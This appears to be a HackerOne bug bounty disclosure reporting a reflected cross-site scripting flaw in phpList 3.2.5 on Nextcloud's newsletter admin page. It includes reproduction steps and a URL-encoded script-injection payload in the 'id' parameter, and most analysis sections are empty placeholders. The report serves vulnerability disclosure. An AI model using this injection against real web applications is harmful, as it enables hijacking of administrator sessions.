# xss for admin of https://newsletter.nextcloud.com

## Metadata
- **Source:** HackerOne
- **Report:** 153799 | https://hackerone.com/reports/153799
- **Submitted:** 2016-07-25
- **Reporter:** sergeym
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
a site https://newsletter.nextcloud.com to have phplist 3.2.5

steps to reproduce:

1. to use firefox browser, latest version
2. go to  https://newsletter.nextcloud.com/admin/?page=viewtemplate&id=123%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E

3. log in as admin
4. alert box with name of domain

please, look at my poc video in attachment (has been installed phplist 3.2.5 on the localhos

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

a site https://newsletter.nextcloud.com to have phplist 3.2.5

steps to reproduce:

1. to use firefox browser, latest version
2. go to  https://newsletter.nextcloud.com/admin/?page=viewtemplate&id=123%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E

3. log in as admin
4. alert box with name of domain

please, look at my poc video in attachment (has been installed phplist 3.2.5 on the localhost)



</details>

---
*Analysed by Claude on 2026-05-24*
